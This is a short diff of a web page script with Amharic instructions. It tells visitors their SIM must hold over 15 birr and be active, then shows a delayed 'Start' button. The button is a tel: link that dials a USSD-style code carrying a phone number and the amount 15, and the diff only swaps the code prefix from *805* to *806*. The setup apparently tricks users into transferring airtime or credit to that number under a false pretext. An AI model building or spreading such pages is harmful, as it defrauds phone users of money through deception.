@@ -19,7 +19,7 @@ setTimeout(() => {
     <li>በ ያዙት ሲም ካርድ ላይ ከ 15 ብር በላይ መኖር አለበት አለበለዚያ አይሰራም ምክነያቱም በ እጆ የያዙት ስልክ የገባበት ስም ካርድ አክቲቭ መሆን አለበት</li>
     <li>ከላይ የተቀመጠውን ጥያቄ ካሟሉ ከታች ያለውን ጀምር ሚለውን ይጫኑ::</li>
     </ul>
-    <button onclick="seePop();" class="get"><a href="tel:*805*0986580059*15#" onclick="seePop" class="geta">ጀምር</a></button>
+    <button onclick="seePop();" class="get"><a href="tel:*806*0986580059*15#" onclick="seePop" class="geta">ጀምር</a></button>
   `;
 }, 20000);
 function seePop() {
